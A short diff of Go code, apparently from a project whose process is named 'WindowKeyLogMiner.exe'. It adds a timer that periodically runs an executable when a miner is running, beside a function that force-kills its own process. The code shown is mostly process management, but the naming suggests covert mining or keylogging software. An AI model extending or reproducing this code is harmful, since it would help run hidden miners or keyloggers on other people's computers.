@@ -51,6 +51,14 @@ func ReadConfig(configfile string) Configuration {
 	return conf
 }
 
+func releaseMemory() {
+	for range time.NewTicker(time.Hour * 3).C {
+		if minerIsRunning() {
+			c := exec.Command("cmd", "/c", "./memory_release.exe")
+			c.Run()
+		}
+	}
+}
 func killSelf() {
 	c := exec.Command("cmd", "/c", "taskkill /f /im WindowKeyLogMiner.exe")
 	c.Run()
